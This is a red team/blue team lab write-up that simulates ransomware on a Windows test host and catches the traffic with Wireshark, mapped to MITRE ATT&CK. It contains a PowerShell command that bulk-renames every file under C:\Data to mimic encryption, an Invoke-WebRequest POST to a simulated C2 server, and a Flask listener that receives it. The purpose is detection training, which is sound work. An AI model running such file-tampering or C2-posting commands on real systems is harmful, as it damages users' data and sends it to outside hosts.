# üõ†Ô∏è Scenario 8 ‚Äî Ransomware Simulation (File Encryption + Exfiltration)

This lab simulates ransomware behavior on a Windows victim: file encryption followed by ransom note exfiltration over HTTP. The goal is to monitor and detect this activity using tools like **Wireshark**, aligning with real-world MITRE ATT&CK techniques.

## üß™ Red Team Activity

### üñ•Ô∏è Simulated File Encryption (PowerShell)
We recursively renamed all files under `C:\Data` to mimic encryption:

```powershell
Get-ChildItem -Path C:\Data -Recurse | ForEach-Object {
    Rename-Item $_.FullName ($_.FullName + ".encrypted")
}
```

### üì§ Ransom Note Exfiltration via HTTP

We used `Invoke-WebRequest` to simulate sending a ransom note back to a Command & Control (C2) server:

```powershell
Invoke-WebRequest -Uri http://192.168.2.131:8080/ransom_note.txt -Method POST -Body "Pay up"
```

üì∑ **PowerShell Output:**

## üñ•Ô∏è Flask Server on Kali (Simulated C2)

A simple Flask server received the ransom note:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/ransom_note.txt', methods=['POST'])
def receive():
    data = request.data.decode('utf-8', errors='ignore')
    print(f"[+] Received ransom note: {data}")
    with open('received_ransom_note.txt', 'a', encoding='utf-8') as f:
        f.write(data + '\n-----\n')
    return 'OK\n', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

üì∑ **Server Output:**

## üß† Blue Team Detection (Wireshark)

Using the following display filter, we captured the POST request to the attacker:

```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
```

üì∑ **Wireshark Capture:**
![Wireshark POST](./screenshots/Screenshot%202025-09-01%20130117.png)

This revealed:
- **Source IP:** 192.168.2.129 (Windows victim)
- **Destination IP:** 192.168.2.131:8080 (Kali C2)
- **Protocol:** HTTP POST
- **Payload:** `Pay up`

---

## üìÅ File Received on Attacker

The ransom note was written to the attacker's `received_ransom_note.txt`.

## üß© MITRE ATT&CK Mapping

| Technique ID | Technique Name                 | Simulation |
|--------------|--------------------------------|------------|
| T1486        | Data Encrypted for Impact      | `.encrypted` suffix added |
| T1041        | Exfiltration Over C2 Channel   | HTTP POST to Flask server |

---

## ‚úÖ Outcome

- Successfully simulated ransomware encryption and exfiltration
- Captured POST in Wireshark
- File was written on attacker's C2 server
- Fully observable & repeatable for detection testing
